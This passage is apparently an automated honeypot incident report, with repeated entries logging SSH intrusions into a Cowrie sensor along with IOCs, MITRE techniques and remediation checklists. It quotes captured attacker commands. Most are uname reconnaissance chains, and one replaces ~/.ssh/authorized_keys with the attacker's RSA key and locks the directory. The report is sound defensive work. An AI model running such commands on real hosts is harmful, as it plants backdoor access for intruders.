| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 15:15:50` | `cowrie.session.connect` |
| `2026-09-01 15:15:51` | `cowrie.client.version` |
| `2026-09-01 15:15:51` | `cowrie.client.kex` |
| `2026-09-01 15:15:53` | `cowrie.login.success` |
| `2026-09-01 15:15:54` | `cowrie.session.params` |
| `2026-09-01 15:15:54` | `cowrie.command.input` |
| `2026-09-01 15:15:54` | `cowrie.command.input` |
| `2026-09-01 15:15:54` | `cowrie.command.input` |
| `2026-09-01 15:15:54` | `cowrie.command.input` |
| `2026-09-01 15:15:54` | `cowrie.command.input` |
| `2026-09-01 15:15:54` | `cowrie.command.success` |
| `2026-09-01 15:15:54` | `cowrie.command.input` |
| `2026-09-01 15:15:54` | `cowrie.command.input` |
| `2026-09-01 15:15:54` | `cowrie.command.input` |
| `2026-09-01 15:15:54` | `cowrie.command.input` |
| `2026-09-01 15:15:55` | `cowrie.log.closed` |
| `2026-09-01 15:15:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdc7549f2169

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 15:17 |
| **Last Seen** | 2026-09-01 15:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 15:17:27` | `cowrie.session.connect` |
| `2026-09-01 15:17:27` | `cowrie.client.version` |
| `2026-09-01 15:17:27` | `cowrie.client.kex` |
| `2026-09-01 15:17:28` | `cowrie.login.success` |
| `2026-09-01 15:17:28` | `cowrie.direct-tcpip.request` |
| `2026-09-01 15:17:28` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 15:17:28` | `cowrie.direct-tcpip.data` |
| `2026-09-01 15:17:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0d8457702d2

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-01 15:17 |
| **Last Seen** | 2026-09-01 15:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 15:17:36` | `cowrie.session.connect` |
| `2026-09-01 15:17:37` | `cowrie.client.version` |
| `2026-09-01 15:17:37` | `cowrie.client.kex` |
| `2026-09-01 15:17:38` | `cowrie.login.success` |
| `2026-09-01 15:17:40` | `cowrie.session.params` |
| `2026-09-01 15:17:40` | `cowrie.command.input` |
| `2026-09-01 15:17:40` | `cowrie.command.input` |
| `2026-09-01 15:17:40` | `cowrie.command.input` |
| `2026-09-01 15:17:40` | `cowrie.command.input` |
| `2026-09-01 15:17:40` | `cowrie.command.input` |
| `2026-09-01 15:17:40` | `cowrie.command.success` |
| `2026-09-01 15:17:40` | `cowrie.command.input` |
| `2026-09-01 15:17:40` | `cowrie.command.input` |
| `2026-09-01 15:17:40` | `cowrie.command.input` |
| `2026-09-01 15:17:40` | `cowrie.command.input` |
| `2026-09-01 15:17:40` | `cowrie.log.closed` |
| `2026-09-01 15:17:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b5c5f9f3983

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-01 15:19 |
| **Last Seen** | 2026-09-01 15:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 15:19:25` | `cowrie.session.connect` |
| `2026-09-01 15:19:25` | `cowrie.client.version` |
| `2026-09-01 15:19:25` | `cowrie.client.kex` |
| `2026-09-01 15:19:26` | `cowrie.login.success` |
| `2026-09-01 15:19:28` | `cowrie.session.params` |
| `2026-09-01 15:19:28` | `cowrie.command.input` |
| `2026-09-01 15:19:28` | `cowrie.command.input` |
| `2026-09-01 15:19:28` | `cowrie.command.input` |
| `2026-09-01 15:19:28` | `cowrie.command.input` |
| `2026-09-01 15:19:28` | `cowrie.command.input` |
| `2026-09-01 15:19:28` | `cowrie.command.success` |
| `2026-09-01 15:19:28` | `cowrie.command.input` |
| `2026-09-01 15:19:28` | `cowrie.command.input` |
| `2026-09-01 15:19:28` | `cowrie.command.input` |
| `2026-09-01 15:19:28` | `cowrie.command.input` |
| `2026-09-01 15:19:28` | `cowrie.log.closed` |
| `2026-09-01 15:19:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b429ead3d003

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-01 15:21 |
| **Last Seen** | 2026-09-01 15:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 15:21:22` | `cowrie.session.connect` |
| `2026-09-01 15:21:22` | `cowrie.client.version` |
| `2026-09-01 15:21:22` | `cowrie.client.kex` |
| `2026-09-01 15:21:23` | `cowrie.login.success` |
| `2026-09-01 15:21:24` | `cowrie.session.params` |
| `2026-09-01 15:21:24` | `cowrie.command.input` |
| `2026-09-01 15:21:24` | `cowrie.command.input` |
| `2026-09-01 15:21:24` | `cowrie.command.input` |
| `2026-09-01 15:21:24` | `cowrie.command.input` |
| `2026-09-01 15:21:24` | `cowrie.command.input` |
| `2026-09-01 15:21:24` | `cowrie.command.success` |
| `2026-09-01 15:21:24` | `cowrie.command.input` |
| `2026-09-01 15:21:24` | `cowrie.command.input` |
| `2026-09-01 15:21:24` | `cowrie.command.input` |
| `2026-09-01 15:21:24` | `cowrie.command.input` |
| `2026-09-01 15:21:25` | `cowrie.log.closed` |
| `2026-09-01 15:21:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1013d4947110

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 15:21 |
| **Last Seen** | 2026-09-01 15:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 15:21:44` | `cowrie.session.connect` |
| `2026-09-01 15:21:44` | `cowrie.client.version` |
| `2026-09-01 15:21:44` | `cowrie.client.kex` |
| `2026-09-01 15:21:45` | `cowrie.login.success` |
| `2026-09-01 15:21:45` | `cowrie.direct-tcpip.request` |
| `2026-09-01 15:21:45` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 15:21:45` | `cowrie.direct-tcpip.data` |
| `2026-09-01 15:21:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0f00b4e3c04

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-01 15:23 |
| **Last Seen** | 2026-09-01 15:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 15:23:26` | `cowrie.session.connect` |
| `2026-09-01 15:23:26` | `cowrie.client.version` |
| `2026-09-01 15:23:26` | `cowrie.client.kex` |
| `2026-09-01 15:23:27` | `cowrie.login.success` |
| `2026-09-01 15:23:28` | `cowrie.session.params` |
| `2026-09-01 15:23:28` | `cowrie.command.input` |
| `2026-09-01 15:23:28` | `cowrie.command.input` |
| `2026-09-01 15:23:28` | `cowrie.command.input` |
| `2026-09-01 15:23:28` | `cowrie.command.input` |
| `2026-09-01 15:23:28` | `cowrie.command.input` |
| `2026-09-01 15:23:28` | `cowrie.command.success` |
| `2026-09-01 15:23:28` | `cowrie.command.input` |
| `2026-09-01 15:23:28` | `cowrie.command.input` |
| `2026-09-01 15:23:28` | `cowrie.command.input` |
| `2026-09-01 15:23:28` | `cowrie.command.input` |
| `2026-09-01 15:23:29` | `cowrie.log.closed` |
| `2026-09-01 15:23:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a35da8580a6

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-01 15:25 |
| **Last Seen** | 2026-09-01 15:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 15:25:30` | `cowrie.session.connect` |
| `2026-09-01 15:25:30` | `cowrie.client.version` |
| `2026-09-01 15:25:30` | `cowrie.client.kex` |
| `2026-09-01 15:25:31` | `cowrie.login.success` |
| `2026-09-01 15:25:32` | `cowrie.session.params` |
| `2026-09-01 15:25:32` | `cowrie.command.input` |
| `2026-09-01 15:25:32` | `cowrie.command.input` |
| `2026-09-01 15:25:32` | `cowrie.command.input` |
| `2026-09-01 15:25:32` | `cowrie.command.input` |
| `2026-09-01 15:25:32` | `cowrie.command.input` |
| `2026-09-01 15:25:32` | `cowrie.command.success` |
| `2026-09-01 15:25:32` | `cowrie.command.input` |
| `2026-09-01 15:25:32` | `cowrie.command.input` |
| `2026-09-01 15:25:32` | `cowrie.command.input` |
| `2026-09-01 15:25:32` | `cowrie.command.input` |
| `2026-09-01 15:25:32` | `cowrie.log.closed` |
| `2026-09-01 15:25:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30eacf3c1a5a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 15:27 |
| **Last Seen** | 2026-09-01 15:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 15:27:01` | `cowrie.session.connect` |
| `2026-09-01 15:27:01` | `cowrie.client.version` |
| `2026-09-01 15:27:02` | `cowrie.client.kex` |
| `2026-09-01 15:27:02` | `cowrie.login.success` |
| `2026-09-01 15:27:03` | `cowrie.direct-tcpip.request` |
| `2026-09-01 15:27:03` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 15:27:03` | `cowrie.direct-tcpip.data` |
| `2026-09-01 15:27:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1313a10ddb55

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-01 15:27 |
| **Last Seen** | 2026-09-01 15:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 15:27:21` | `cowrie.session.connect` |
| `2026-09-01 15:27:21` | `cowrie.client.version` |
| `2026-09-01 15:27:21` | `cowrie.client.kex` |
| `2026-09-01 15:27:24` | `cowrie.login.success` |
| `2026-09-01 15:27:25` | `cowrie.session.params` |
| `2026-09-01 15:27:25` | `cowrie.command.input` |
| `2026-09-01 15:27:25` | `cowrie.command.input` |
| `2026-09-01 15:27:25` | `cowrie.command.input` |
| `2026-09-01 15:27:25` | `cowrie.command.input` |
| `2026-09-01 15:27:25` | `cowrie.command.input` |
| `2026-09-01 15:27:25` | `cowrie.command.success` |
| `2026-09-01 15:27:25` | `cowrie.command.input` |
| `2026-09-01 15:27:25` | `cowrie.command.input` |
| `2026-09-01 15:27:25` | `cowrie.command.input` |
| `2026-09-01 15:27:25` | `cowrie.command.input` |
| `2026-09-01 15:27:25` | `cowrie.log.closed` |
| `2026-09-01 15:27:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1babff043e0b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-01 15:29 |
| **Last Seen** | 2026-09-01 15:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 15:29:01` | `cowrie.session.connect` |
| `2026-09-01 15:29:01` | `cowrie.client.version` |
| `2026-09-01 15:29:01` | `cowrie.client.kex` |
| `2026-09-01 15:29:03` | `cowrie.login.success` |
| `2026-09-01 15:29:04` | `cowrie.session.params` |
| `2026-09-01 15:29:04` | `cowrie.command.input` |
| `2026-09-01 15:29:04` | `cowrie.command.input` |
| `2026-09-01 15:29:04` | `cowrie.command.input` |
| `2026-09-01 15:29:04` | `cowrie.command.input` |
| `2026-09-01 15:29:04` | `cowrie.command.input` |
| `2026-09-01 15:29:04` | `cowrie.command.success` |
| `2026-09-01 15:29:04` | `cowrie.command.input` |
| `2026-09-01 15:29:04` | `cowrie.command.input` |
| `2026-09-01 15:29:04` | `cowrie.command.input` |
| `2026-09-01 15:29:04` | `cowrie.command.input` |
| `2026-09-01 15:29:05` | `cowrie.log.closed` |
| `2026-09-01 15:29:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ac1b4bdca64

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-01 15:30 |
| **Last Seen** | 2026-09-01 15:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 15:30:42` | `cowrie.session.connect` |
| `2026-09-01 15:30:42` | `cowrie.client.version` |
| `2026-09-01 15:30:42` | `cowrie.client.kex` |
| `2026-09-01 15:30:43` | `cowrie.login.success` |
| `2026-09-01 15:30:45` | `cowrie.session.params` |
| `2026-09-01 15:30:45` | `cowrie.command.input` |
| `2026-09-01 15:30:45` | `cowrie.command.input` |
| `2026-09-01 15:30:45` | `cowrie.command.input` |
| `2026-09-01 15:30:45` | `cowrie.command.input` |
| `2026-09-01 15:30:45` | `cowrie.command.input` |
| `2026-09-01 15:30:45` | `cowrie.command.success` |
| `2026-09-01 15:30:45` | `cowrie.command.input` |
| `2026-09-01 15:30:45` | `cowrie.command.input` |
| `2026-09-01 15:30:45` | `cowrie.command.input` |
| `2026-09-01 15:30:45` | `cowrie.command.input` |
| `2026-09-01 15:30:45` | `cowrie.log.closed` |
| `2026-09-01 15:30:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b478f6d9684c

| Field | Detail |
|---|---|
| **Source IP** | `149.202.50[.]58` |
| **First Seen** | 2026-09-01 15:31 |
| **Last Seen** | 2026-09-01 15:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 15:31:50` | `cowrie.session.connect` |
| `2026-09-01 15:31:50` | `cowrie.client.version` |
| `2026-09-01 15:31:50` | `cowrie.client.kex` |
| `2026-09-01 15:31:50` | `cowrie.login.success` |
| `2026-09-01 15:31:51` | `cowrie.session.params` |
| `2026-09-01 15:31:51` | `cowrie.command.input` |
| `2026-09-01 15:31:51` | `cowrie.command.failed` |
| `2026-09-01 15:31:52` | `cowrie.log.closed` |
| `2026-09-01 15:31:52` | `cowrie.session.params` |
| `2026-09-01 15:31:52` | `cowrie.command.input` |
| `2026-09-01 15:31:52` | `cowrie.session.file_download` |
| `2026-09-01 15:31:52` | `cowrie.log.closed` |
| `2026-09-01 15:31:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `149.202.50[.]58` to AbuseIPDB if not already reported
- [ ] Block `149.202.50[.]58` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b175a485f6d

| Field | Detail |
|---|---|
| **Source IP** | `149.202.50[.]58` |
| **First Seen** | 2026-09-01 15:31 |
| **Last Seen** | 2026-09-01 15:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 15:31:52` | `cowrie.session.connect` |
| `2026-09-01 15:31:52` | `cowrie.client.version` |
| `2026-09-01 15:31:52` | `cowrie.client.kex` |
| `2026-09-01 15:31:53` | `cowrie.login.success` |
| `2026-09-01 15:31:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `149.202.50[.]58` to AbuseIPDB if not already reported
- [ ] Block `149.202.50[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c33f8ba0b96b

| Field | Detail |
|---|---|
| **Source IP** | `149.202.50[.]58` |
| **First Seen** | 2026-09-01 15:31 |
| **Last Seen** | 2026-09-01 15:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 15:31:53` | `cowrie.session.connect` |
